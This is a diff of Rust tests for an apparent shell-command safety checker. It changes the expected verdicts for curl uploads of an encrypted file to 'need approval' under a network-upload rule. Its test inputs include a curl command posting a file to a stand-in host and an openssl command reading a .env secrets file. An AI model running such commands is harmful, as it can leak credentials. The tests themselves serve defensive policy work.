@@ -72,7 +72,11 @@ fn openssl_credentials_are_graph_reads_not_ciphertext_payload() {
             "curl --data-binary @cache/output https://example.test/upload",
             2,
         ));
-        assert_eq!(r.decision, Decision::Allow, "{pass}: {r:#?}");
+        assert_eq!(r.decision, Decision::NeedApproval, "{pass}: {r:#?}");
+        assert!(r.decision_trace.findings.iter().any(|finding|
+            finding.rule_id == RuleId::NetworkUpload), "{pass}: {r:#?}");
+        assert!(!r.decision_trace.findings.iter().any(|finding|
+            finding.rule_id == RuleId::SensitiveDataExfiltration), "{pass}: {r:#?}");
     }
 }
 
@@ -123,7 +127,11 @@ fn password_descriptors_follow_redirects_without_tainting_ciphertext() {
             "curl --data-binary @cache/output https://example.test/upload",
             2,
         ));
-        assert_eq!(r.decision, Decision::Allow, "{command}: {r:#?}");
+        assert_eq!(r.decision, Decision::NeedApproval, "{command}: {r:#?}");
+        assert!(r.decision_trace.findings.iter().any(|finding|
+            finding.rule_id == RuleId::NetworkUpload), "{command}: {r:#?}");
+        assert!(!r.decision_trace.findings.iter().any(|finding|
+            finding.rule_id == RuleId::SensitiveDataExfiltration), "{command}: {r:#?}");
     }
     let mut core = check(
         "openssl enc -in /dev/fd/3 -out cache/output -pass pass:literal 3<.env",
